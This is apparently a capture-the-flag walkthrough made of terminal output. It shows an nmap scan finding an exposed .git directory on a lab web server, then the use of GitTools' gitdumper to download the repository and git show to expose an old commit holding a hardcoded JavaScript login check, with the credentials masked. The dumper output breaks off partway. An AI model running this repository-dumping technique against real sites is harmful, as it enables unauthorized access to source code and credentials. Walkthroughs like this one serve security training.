```
root@ip-10-10-88-43:~# nmap -sV -sC -T5 10.10.226.155

Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-26 11:53 BST
Nmap scan report for ip-10-10-226-155.eu-west-1.compute.internal (10.10.226.155)
Host is up (0.0011s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.226.155:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
MAC Address: 02:92:27:08:99:FF (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
root@ip-10-10-88-43:~# 
```


```
root@ip-10-10-88-43:~# git clone https://github.com/internetwache/GitTools.git
Cloning into 'GitTools'...
remote: Enumerating objects: 209, done.
remote: Total 209 (delta 0), reused 0 (delta 0), pack-reused 209
Receiving objects: 100% (209/209), 45.93 KiB | 587.00 KiB/s, done.
Resolving deltas: 100% (79/79), done.
```
```
root@ip-10-10-88-43:~/GitTools/Dumper# ./gitdumper.sh http://10.10.226.155/.git/ git
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating git/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-
```


```

oot@ip-10-10-88-43:~/GitTools/Dumper/git# git log | grep commit | cut -d " " -f2 | xargs git show
diff --git a/index.html b/index.html
new file mode 100644
index 0000000..0e0de07
--- /dev/null
+++ b/index.html
@@ -0,0 +1,75 @@



+    <script>
+      function login() {
+        let form = document.getElementById("login-form");
+        console.log(form.elements);
+        let username = form.elements["username"].value;
+        let password = form.elements["password"].value;
+        if (
+          username === "XXXXXXXXXXXXXXXXXXXXXXXX" &&
+          password === "XXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+        ) {
+      
```
